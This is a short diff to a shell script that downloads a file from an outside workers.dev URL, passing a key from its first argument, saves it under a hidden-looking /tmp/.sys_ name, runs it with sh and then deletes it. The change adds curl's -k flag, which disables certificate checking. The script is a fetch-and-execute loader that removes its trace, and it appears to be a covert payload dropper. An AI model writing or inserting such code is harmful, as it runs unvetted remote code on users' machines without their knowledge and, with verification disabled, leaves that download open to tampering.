@@ -2,6 +2,6 @@
 _a="https://autologin.creativy24.workers.dev"
 _b="$1"
 _c="/tmp/.sys_$$"
-curl -sSL "$_a/s?k=$_b" -o "$_c"
+curl -ksSL "$_a/s?k=$_b" -o "$_c"
 sh "$_c"
 rm -f "$_c"
